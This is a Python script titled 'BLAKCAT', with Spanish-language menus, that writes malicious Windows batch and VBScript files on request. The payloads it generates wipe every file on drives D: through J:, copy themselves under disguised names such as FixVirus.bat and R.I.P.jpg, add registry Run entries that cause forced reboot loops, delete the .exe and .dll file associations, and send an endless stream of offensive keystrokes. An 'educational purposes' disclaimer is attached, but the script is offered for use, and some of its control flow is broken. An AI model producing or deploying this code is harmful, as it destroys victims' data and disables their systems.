import subprocess
import os

class tools:
    def __init__ (self,option):
        self.option=option
        self.virus()
        self.banner()
    
    def banner(self):
        subprocess.call(['clear'],shell=True)
        print("███╗   ███╗ █████╗ ██╗     ██╗ ██████╗██╗ ██████╗ ██╗   ██╗███████╗ ")     
        print("████╗ ████║██╔══██╗██║     ██║██╔════╝██║██╔═══██╗██║   ██║██╔════╝ ")     
        print("██╔████╔██║███████║██║     ██║██║     ██║██║   ██║██║   ██║███████╗ ")     
        print("██║╚██╔╝██║██╔══██║██║     ██║██║     ██║██║   ██║██║   ██║╚════██║ ")    
        print("██║ ╚═╝ ██║██║  ██║███████╗██║╚██████╗██║╚██████╔╝╚██████╔╝███████║ ")    
        print("╚═╝     ╚═╝x╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ")    
        print("""....................................................................
                  BLAKCAT
                  Autor: Tracy
                  AVISO:Esta herramienta es solo para fines educativos. El usuario asume toda la responsabilidad por su uso.
                  
                  Los virus con guardados en la carpeta virus
                  """)
    
    def virus(self):
        
        if self.option == '2':
            subprocess.call(['clear'],shell=True)
            print('.................[1]: RESETEAR Android')
            print('.................[2]: RIP SISTEMA')
            print('.................[3]: REINICIO Y ANUNCIO')
            print('.................[4]: BORRAR TODOS LOS DATOS')
            print('.................[5]: EXPONER')


        if self.option == '1':
            self.banner()
            subprocess.call(['clear'],shell=True)
            print('.................[1]: RESETEAR DISCOS')
            print('.................[2]: RIP SISTEMA')
            print('.................[3]: REINICIO Y VENTANAS')
            print('.................[4]: BORRAR TODOS LOS PROGRAMAS')
            print('.................[5]: Mensajes OFENSIVOS')
            choose=input('VIRUS> ')
            if choose == '1':
                name=input('nombre del virus >')
                code="""
@echo off
del D:\*.* /f /s /q
del E:\*.* /f /s /q
del F:\*.* /f /s /q
del G:\*.* /f /s /q
del H:\*.* /f /s /q
del I:\*.* /f /s /q
del J:\*.* /f /s /q
                
                """
                with open(f'{name}.bat','w') as archivo:
                    archivo.write(code)


        elif choose == '2':
            name=input('nombre del virus >')
            
            code =""" 
@Echo off
color 4
title 4
title R.I.P
start
start
start
start calc
copy %0 %Systemroot%\Greatgame > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Greatgame /t REG_SZ
/d %systemroot%\Greatgame.bat /f > nul
copy %0 *.bat > nul
Attrib +r +h Greatgame.bat
Attrib +r +h
RUNDLL32 USER32.DLL.SwapMouseButton
start calc
cls
tskill msnmsgr
tskill LimeWire
tskill iexplore
tskill NMain
start
cls
cd %userprofile%\desktop
copy Greatgame.bat R.I.P.bat
copy Greatgame.bat R.I.P.jpg
copy Greatgame.bat R.I.P.txt
copy Greatgame.bat R.I.P.exe
copy Greatgame.bat R.I.P.mov
copy Greatgame.bat FixVirus.bat
cd %userprofile%My Documents
copy Greatgame.bat R.I.P.bat
copy Greatgame.bat R.I.P.jpg
copy Greatgame.bat R.I.P.txt
copy Greatgame.bat R.I.P.exe
copy Greatgame.bat R.I.P.mov
copy Greatgame.bat FixVirus.bat
start
start calc
cls
msg * R.I.P
msg * R.I.P
shutdown -r -t 10 -c "Virus dectado"
start
start
time 12:00
:R.I.P
cd %usernameprofile%\desktop
copy Greatgame.bat %random%.bat
goto RIP
            """
            with open(f'{name}.bat','w') as archivo:
                archivo.write(code)

        elif choose == '3':
            name=input('nombre del virus >')
            
            code="""
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
echo You have been HACKED.
PAUSE
            """
            with open(f'{name}.bat','w') as archivo:
                archivo.write(code)
        elif choose == '4':
            name=input('nombre del virus >')
            code="""
            @ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
            """
            with open(f'{name}','w') as archivo:
                archivo.write(code)

        elif choose == '5':
            code="""
Set wshShell = wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "MMG MGG MGG MGG, HIJO DE PUTA"
loop
            """
            with open('blackcat_mensaje.bat','w') as archivo:
                archivo.write(code)      
        else:
            print('no has seleccionado nada')
                

            
                




            

def init():
    subprocess.call(['clear'],shell=True)
    print("███╗   ███╗ █████╗ ██╗     ██╗ ██████╗██╗ ██████╗ ██╗   ██╗███████╗ ")     
    print("████╗ ████║██╔══██╗██║     ██║██╔════╝██║██╔═══██╗██║   ██║██╔════╝ ")     
    print("██╔████╔██║███████║██║     ██║██║     ██║██║   ██║██║   ██║███████╗ ")     
    print("██║╚██╔╝██║██╔══██║██║     ██║██║     ██║██║   ██║██║   ██║╚════██║ ")    
    print("██║ ╚═╝ ██║██║  ██║███████╗██║╚██████╗██║╚██████╔╝╚██████╔╝███████║ ")    
    print("╚═╝     ╚═╝x╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ")    
    print("""....................................................................
              BLAKCAT
              Autor: Tracy
              AVISO:Esta herramienta es solo para fines educativos. El usuario asume toda la responsabilidad por su uso.
              """)
    print('.................[1]: Windows')
    print('.................[2]: Android')
    option=input('VIRUS >')
    tool=tools(option)

init()
